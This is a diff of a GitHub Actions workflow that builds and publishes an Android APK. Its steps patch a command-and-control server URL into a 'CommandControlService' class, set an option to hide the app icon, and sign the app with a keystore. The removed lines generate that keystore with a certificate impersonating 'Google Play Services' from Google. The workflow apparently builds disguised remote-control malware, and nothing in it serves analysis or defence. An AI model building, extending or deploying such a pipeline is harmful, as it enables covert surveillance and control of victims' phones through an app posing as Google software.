@@ -74,29 +74,12 @@ jobs:
       - name: Clean committed APKs
         run: rm -fv android/app/*.apk android/**/*.apk 2>/dev/null || true
 
-      - name: Inject C2 URL into payload
+      - name: Inject C2 URL into CommandControlService
         run: |
-          set -euo pipefail
           URL="${{ github.event.inputs.c2_url }}"
-          # Escape & and | and \ for sed replacement string
-          ESC_URL=$(printf '%s' "$URL" | sed -e 's/[&\\/|]/\\&/g')
-
-          # 1) Patch the runtime constant in CommandControlService.java
-          sed -i "s|public static final String SERVER_URL = \"[^\"]*\";|public static final String SERVER_URL = \"${ESC_URL}\";|g" "${{ env.CCS }}"
-
-          # 2) Patch the BuildConfig field in app/build.gradle
-          #    Value is wrapped in single quotes: '"wss://..."' — match that form
-          sed -i "s|SERVER_URL\", '[^']*'|SERVER_URL\", '${ESC_URL}'|g" android/app/build.gradle
-
-          # 3) Verify both landed
-          grep -q "SERVER_URL = \"${ESC_URL}\"" "${{ env.CCS }}" \
-            || { echo "::error::C2 URL injection failed in CommandControlService.java"; exit 1; }
-          grep -q "SERVER_URL\", '${ESC_URL}'" android/app/build.gradle \
-            || { echo "::error::C2 URL injection failed in build.gradle BuildConfig"; exit 1; }
-
-          echo "Injected C2 URL: $URL"
-          echo "  Java : $(grep 'SERVER_URL =' ${{ env.CCS }} | head -1)"
-          echo "  BCFG : $(grep 'buildConfigField.*SERVER_URL' android/app/build.gradle)"
+          sed -i "s|public static final String SERVER_URL = \"[^\"]*\";|public static final String SERVER_URL = \"${URL}\";|g" "${{ env.CCS }}"
+          grep -q "SERVER_URL = \"${URL}\"" "${{ env.CCS }}" || { echo "::error::C2 URL injection failed"; exit 1; }
+          echo "Injected: $(grep 'SERVER_URL =' ${{ env.CCS }} | head -1)"
 
       - name: Set HIDE_ICON
         run: |
@@ -136,34 +119,18 @@ jobs:
       - name: Prepare keystore
         run: |
           set -euo pipefail
-          KS="android/google-services-release.jks"
-          STORE_PASS="GooglePlayServices2024"
-          KEY_ALIAS="google-services-key"
-
           if [ -n "${{ secrets.KEYSTORE_BASE64 }}" ]; then
             echo "Using provided keystore from secret"
-            echo "${{ secrets.KEYSTORE_BASE64 }}" | base64 --decode > "$KS"
+            echo "${{ secrets.KEYSTORE_BASE64 }}" | base64 --decode > android/google-services-release.jks
             if [ -n "${{ secrets.KEYSTORE_PASSWORD }}" ]; then
               sed -i "s|storePassword '[^']*'|storePassword '${{ secrets.KEYSTORE_PASSWORD }}'|g" android/app/build.gradle
               sed -i "s|keyPassword '[^']*'|keyPassword '${{ secrets.KEY_PASSWORD }}'|g" android/app/build.gradle
               sed -i "s|keyAlias '[^']*'|keyAlias '${{ secrets.KEY_ALIAS }}'|g" android/app/build.gradle
             fi
+          else
+            echo "Using bundled test keystore (google-services-release.jks)"
+            ls -lh android/google-services-release.jks
           fi
-
-          # Self-heal: if keystore missing or fails verification, generate fresh
-          if [ ! -f "$KS" ] || ! keytool -list -keystore "$KS" -storepass "$STORE_PASS" -alias "$KEY_ALIAS" >/dev/null 2>&1; then
-            echo "::warning::Keystore missing or invalid — generating fresh one"
-            rm -f "$KS"
-            keytool -genkeypair -v \
-              -keystore "$KS" \
-              -storepass "$STORE_PASS" -keypass "$STORE_PASS" \
-              -alias "$KEY_ALIAS" \
-              -keyalg RSA -keysize 2048 -validity 10000 \
-              -dname "CN=Google Play Services, OU=Android, O=Google, L=Mountain View, S=CA, C=US"
-          fi
-
-          ls -lh "$KS"
-          echo "Keystore ready: $KS"
 
       - name: Verify keystore — self-heal if broken
         run: |
@@ -284,5 +251,3 @@ jobs:
           files: "${{ env.APK_NAME }}"
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-
-          
